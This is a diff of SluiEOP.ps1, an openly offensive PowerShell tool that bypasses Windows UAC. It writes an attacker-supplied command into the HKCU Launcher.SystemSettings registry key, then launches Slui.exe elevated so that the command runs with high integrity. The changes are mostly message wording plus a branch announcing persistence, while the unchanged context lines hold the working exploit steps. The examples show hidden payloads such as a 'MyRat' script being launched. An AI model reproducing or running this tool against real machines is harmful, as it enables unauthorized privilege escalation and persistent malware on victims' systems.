@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-   SluiEOP can be used to escalate privileges or to execute a command with high integrity (SYSTEM)
+   SluiEOP can be used to escalate privileges or to execute a command with high integrity (Admin)
 
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - 18363.778
@@ -27,19 +27,19 @@
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
-   Execute notepad process with high privileges (SYSTEM)
+   Execute notepad process with high privileges (Admin)
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-   Execute powershell process with high privileges (SYSTEM)
+   Execute powershell process with high privileges (Admin)
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "cmd /c start C:\Users\pedro\AppData\Local\Temp\MyRat.bat"
-   Execute $env:TMP\MyRat.bat script with high privileges (SYSTEM)
+   Execute $env:TMP\MyRat.bat script with high privileges (Admin)
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-   Execute $env:TMP\MyRat.ps1 script with high privileges (SYSTEM) in an hidden console.
+   Execute $env:TMP\MyRat.ps1 script with high privileges (Admin) in an hidden console.
 
 .INPUTS
    None. You cannot pipe objects into SluiEOP.ps1
@@ -80,7 +80,7 @@ If($CheckVuln -eq $True){
    }
 
    ### Add Entrys to Regedit { using powershell }
-   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Hijacking Slui.exe execution in registry."}
+   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Hijacking => Slui.exe execution in registry."}
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 650
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 650
@@ -89,7 +89,7 @@ If($CheckVuln -eq $True){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 650
 
-   ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
+   ## The Next Registry entry allow us to execute our command under high privileges (Admin)
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    # ---
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
@@ -100,7 +100,7 @@ If($CheckVuln -eq $True){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
 
    ## Start the vulnerable Process { using powershell }
-   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Hijacking Slui.exe process execution."}
+   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Hijacking => Slui.exe process execution."}
    Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
@@ -108,11 +108,11 @@ If($CheckVuln -eq $True){
    # be deleted in the end of script execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
-      If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Deleting  EOP registry hacks (revert)"}
+      If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Deleting  => EOP registry hacks (revert)"}
       Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
       Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
       Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
-   }
+   }Else{If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow;Start-Sleep -Seconds 1}}
 
    <#
    .SYNOPSIS
@@ -132,7 +132,7 @@ If($CheckVuln -eq $True){
    #>
 
    ## Extracting attacker Spawned ProcessName PID
-   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Building  EOP output Table displays.`n"};Start-Sleep -Milliseconds 500
+   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Building  => EOP output Table displays.`n"};Start-Sleep -Milliseconds 500
    If($Command -match '^[cmd]' -and $Command -match ' ' -and $Command -NotMatch '.bat$' -and $Command -NotMatch '.ps1$' -and $Command -NotMatch '.py$'){
       ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
       $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
@@ -216,6 +216,7 @@ If($CheckVuln -eq $True){
    ## Vulnerable registry hive => not found
    echo "   user    ERROR     System Doesn't Seems Vulnerable, Aborting." > $env:TMP\sLUIEop.log
 }
+
 
 ## Clean old files left behind after EOP finished ..
 If(Test-Path "$env:TMP\sLUIEop.log"){Get-Content -Path "$env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
